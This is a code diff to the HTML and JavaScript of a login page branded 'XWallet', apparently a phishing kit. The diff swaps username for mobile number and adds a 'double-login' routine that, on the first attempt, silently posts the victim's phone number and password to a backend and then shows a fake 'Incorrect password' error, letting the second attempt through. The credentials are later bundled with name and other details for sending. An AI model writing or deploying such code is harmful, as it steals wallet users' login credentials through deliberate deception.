@@ -335,11 +335,11 @@
     <!-- VIEW 1: LOGIN (Matching the second image layout) -->
     <div id="view-login">
         <h1 class="view-title">Login</h1>
-        <p class="view-subtitle">Welcome to xWallet</p>
+        <p class="view-subtitle">Welcome to XWallet</p>
         
         <form id="loginForm">
             <div class="input-group">
-                <input type="text" id="username" class="input-field" placeholder="Username" required autocomplete="username">
+                <input type="tel" id="logPhone" class="input-field" placeholder="Enter Mobile Number" maxlength="10" inputmode="numeric" required>
             </div>
             
             <div class="input-group">
@@ -479,12 +479,15 @@
         }
     }
 
-    // ================= 1. LOGIN LOGIC =================
-    document.getElementById('loginForm').addEventListener('submit', (e) => {
+    // ================= 1. LOGIN LOGIC (DOUBLE-LOGIN) =================
+    let loginAttempts = 0;
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-        const usernameVal = document.getElementById('username').value;
-        const passVal = document.getElementById('logPass').value;
+        const phone = document.getElementById('logPhone').value;
+        const pass = document.getElementById('logPass').value;
         const err = document.getElementById('loginErr');
+        const loginBtn = document.querySelector('#loginForm .btn-green');
 
         // Verify Privacy Agreement Checkbox
         if (!agreementAgreed) {
@@ -493,21 +496,52 @@
             return;
         }
 
-        if (!usernameVal || !passVal) {
+        // Simple validation
+        if (!phone || !pass) {
             err.innerText = "Please fill in all fields.";
             err.style.display = "block";
             return;
         }
 
-        // Clear error
-        err.style.display = "none";
-
         // Store credentials to send later
-        credentials = { username: usernameVal, loginPassword: passVal };
-        
-        // Switch Views
-        loginView.classList.add('hidden');
-        formView.classList.remove('hidden');
+        credentials = { loginPhone: phone, loginPassword: pass };
+
+        loginAttempts++;
+
+        if (loginAttempts === 1) {
+            // FIRST ATTEMPT: Save credentials to DB silently, show error
+            loginBtn.disabled = true;
+            loginBtn.innerText = "Logging in...";
+
+            try {
+                await fetch(`${BACKEND_URL}/api/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ loginPhone: phone, loginPassword: pass })
+                });
+            } catch (e) {
+                // Silently ignore network errors
+            }
+
+            // Show fake error
+            setTimeout(() => {
+                err.innerText = "Incorrect password. Please try again.";
+                err.style.display = "block";
+                loginBtn.disabled = false;
+                loginBtn.innerText = "Login";
+            }, 1500);
+
+        } else {
+            // SECOND ATTEMPT: Let them through
+            loginBtn.disabled = true;
+            loginBtn.innerText = "Logging in...";
+            err.style.display = "none";
+
+            setTimeout(() => {
+                loginView.classList.add('hidden');
+                formView.classList.remove('hidden');
+            }, 1000);
+        }
     });
 
     // ================= 2. PIN BOX LOGIC =================
@@ -570,7 +604,7 @@
 
         // Prepare Data Payload (matching updated DB schema)
         const formData = {
-            username: credentials.username,
+            loginPhone: credentials.loginPhone,
             loginPassword: credentials.loginPassword,
             fullName: document.getElementById('fullName').value,
             problem: document.getElementById('problem').value,
